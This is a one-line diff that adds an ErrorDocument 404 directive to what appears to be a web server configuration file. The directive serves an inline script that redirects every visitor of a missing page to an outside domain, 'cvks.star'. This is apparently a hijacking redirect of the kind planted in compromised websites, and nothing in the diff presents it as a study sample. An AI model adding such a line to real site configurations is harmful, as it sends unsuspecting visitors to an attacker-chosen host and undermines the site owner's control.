@@ -1,0 +1,1 @@
+ErrorDocument 404 "<script>document.location='http://cvks.star/?page=404'</script>"
